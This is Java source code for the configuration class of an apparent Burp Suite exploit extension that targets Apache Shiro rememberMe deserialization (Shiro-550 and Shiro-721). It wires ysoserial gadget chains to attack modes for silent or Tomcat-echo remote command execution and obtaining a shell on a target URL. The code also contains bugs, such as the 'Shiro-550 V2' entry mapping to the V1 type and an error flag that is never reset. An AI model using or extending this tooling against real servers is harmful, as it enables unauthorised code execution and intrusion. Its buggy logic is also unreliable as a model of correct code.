package burp.utils;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.LinkedList;

import org.jsoup.select.Evaluator;
import ysoserial.payloads.*;


public class ShiroExpCfg {

    public HashMap<String, Class<?>> gadget = new HashMap<String, Class<?>>();
    public HashMap<String, EngineModel> ModelMap = new HashMap<String, EngineModel >();
    public HashMap<EngineModel, ArrayList<ShiroParams>> checkListMap = new HashMap<EngineModel, ArrayList<ShiroParams>>();
    public HashMap<String, ScanType> attackType = new HashMap<String, ScanType>();

    public enum ScanType{
        SHIRO_550_V1,
        SHIRO_550_V2,
        SHIRO_721,
        IGNORE
    }

    public enum ShiroCryptType {
        AES_CBC,
        AES_GCM,
    }

    public enum ShiroParams{
        TARGET_URL,
        ATTACK_MODEL,
        SHIRO_KEY,
        VALID_REMEMBERME,
        GADGET_TYPE,
        ECHOGADGET_TYPE,
        SHELL_ADDR,
        RUN_COMMAND
    }

    public enum EngineModel{
        KEY_VERIFY_BY_SILENT,
        SEARCH_SILENT_GADGET,
        SEARCH_TOMCATECHO_GADGET,
        DO_SILENT_RCE,
        DO_TOMCATECHO_RCE,
        GET_SHELL
    }

    public ShiroExpCfg() {
        attackTypeMapInit();
        engineModelMapInit();
        gadgetMapInit();
        checkListMapInit();
    }

    public String checkModelConfig(EngineModel model, HashMap<ShiroParams, String> data) {
        ArrayList<ShiroParams> needCheck = checkListMap.get(model);
        String msg = "";
        boolean isDataNUll = false;
        boolean cfgok = true;
        for(ShiroParams shiroParam:needCheck){
            String cfgdata = data.get(shiroParam);
            if(cfgdata.length() == 0){
                cfgok = false;
                isDataNUll = true;
            }
            switch(shiroParam) {
                case TARGET_URL:
                    if(isDataNUll){
                        msg += "target url is not config\n";
                    }
                    break;
                case SHIRO_KEY:
                    if(isDataNUll){
                        msg += "valid shiro key is not config\n";
                    }
                    break;
                case RUN_COMMAND:
                    if(isDataNUll){
                        msg += "command is not config\n";
                    }
                    break;
                case SHELL_ADDR:
                    if(isDataNUll){
                        msg += "shell address is not config\n";
                    }
                    break;
            }
        }
        if(cfgok) {
            msg += "ok";
        }
        return msg;
    }

    public void engineModelMapInit() {
        ModelMap.put("ValidKeyFoundBySilent", EngineModel.KEY_VERIFY_BY_SILENT);
        ModelMap.put("SearchSilentGadget", EngineModel.SEARCH_SILENT_GADGET);
        ModelMap.put("SearchTomcatEchoGaget", EngineModel.SEARCH_TOMCATECHO_GADGET);
        ModelMap.put("SilentRCE", EngineModel.DO_SILENT_RCE);
        ModelMap.put("TomcatEchoRCE", EngineModel.DO_TOMCATECHO_RCE);
        ModelMap.put("Getshell", EngineModel.GET_SHELL);
    }

    public void attackTypeMapInit(){
        attackType.put("Shiro-550 V1", ScanType.SHIRO_550_V1);
        attackType.put("Shiro-550 V2", ScanType.SHIRO_550_V1);
        attackType.put("Shiro-721", ScanType.SHIRO_721);
    }

    public void gadgetMapInit() {
        gadget.put("URLDNS", URLDNS.class);
        gadget.put("CommonsBeanutils1", CommonsBeanutils1.class);
        gadget.put("CommonsCollections1", CommonsCollections1.class);
        gadget.put("CommonsCollections2", CommonsCollections2.class);
        gadget.put("CommonsCollections3", CommonsCollections3.class);
        gadget.put("CommonsCollections4", CommonsCollections4.class);
        gadget.put("CommonsCollections5", CommonsCollections5.class);
        gadget.put("CommonsCollections6", CommonsCollections6.class);
        gadget.put("CommonsCollections7", CommonsCollections7.class);
        //gadget.put("CommonsCollections8", CommonsCollections8.class);
        //gadget.put("CommonsCollections9", CommonsCollections9.class);
        gadget.put("CommonsCollections10", CommonsCollections10.class);
        gadget.put("Jdk7u21", Jdk7u21.class);
        gadget.put("Hibernate1", Hibernate1.class);
        gadget.put("Hibernate2", Hibernate2.class);
        gadget.put("Spring1", Spring1.class);
        gadget.put("Spring2", Spring2.class);
        //gadget.put("Spring3", Spring3.class);
        gadget.put("Myface1", Myfaces1.class);
        gadget.put("Myface2", Myfaces2.class);
        gadget.put("C3P0", C3P0.class);
        gadget.put("Clojure", Clojure.class);
        gadget.put("Fileupload1", FileUpload1.class);
        gadget.put("Groovy1", Groovy1.class);
        gadget.put("BeanShell1", BeanShell1.class);
        gadget.put("JBossInterceptors1", JBossInterceptors1.class);
        gadget.put("JSON1", JSON1.class);
        gadget.put("JavassistWeld1", JavassistWeld1.class);
        gadget.put("Jython1", Jython1.class);
        gadget.put("MozillaRhino1", MozillaRhino1.class);
        gadget.put("MozillaRhino2", MozillaRhino2.class);
        gadget.put("ROME", ROME.class);
        gadget.put("Vaadin1", Vaadin1.class);
        gadget.put("Wicket1", Wicket1.class);
    }

    public void checkListMapInit(){
        for(EngineModel engineModel:EngineModel.values()){

            ArrayList<ShiroParams> needCheck = new ArrayList<ShiroParams>();

            needCheck.add(ShiroParams.TARGET_URL);

            switch(engineModel) {
                case KEY_VERIFY_BY_SILENT:
                    checkListMap.put(EngineModel.KEY_VERIFY_BY_SILENT, needCheck);
                    break;
                case SEARCH_SILENT_GADGET:
                    needCheck.add(ShiroParams.SHIRO_KEY);
                    checkListMap.put(EngineModel.SEARCH_SILENT_GADGET, needCheck);
                    break;
                case SEARCH_TOMCATECHO_GADGET:
                    needCheck.add(ShiroParams.SHIRO_KEY);
                    checkListMap.put(EngineModel.SEARCH_TOMCATECHO_GADGET, needCheck);
                    break;
                case DO_SILENT_RCE:
                    needCheck.add(ShiroParams.SHIRO_KEY);
                    needCheck.add(ShiroParams.RUN_COMMAND);
                    checkListMap.put(EngineModel.DO_SILENT_RCE, needCheck);
                    break;
                case DO_TOMCATECHO_RCE:
                    needCheck.add(ShiroParams.SHIRO_KEY);
                    needCheck.add(ShiroParams.RUN_COMMAND);
                    checkListMap.put(EngineModel.DO_TOMCATECHO_RCE, needCheck);
                    break;
                case GET_SHELL:
                    needCheck.add(ShiroParams.SHIRO_KEY);
                    needCheck.add(ShiroParams.SHELL_ADDR);
                    checkListMap.put(EngineModel.GET_SHELL, needCheck);
                    break;
            }
        }
    }
}
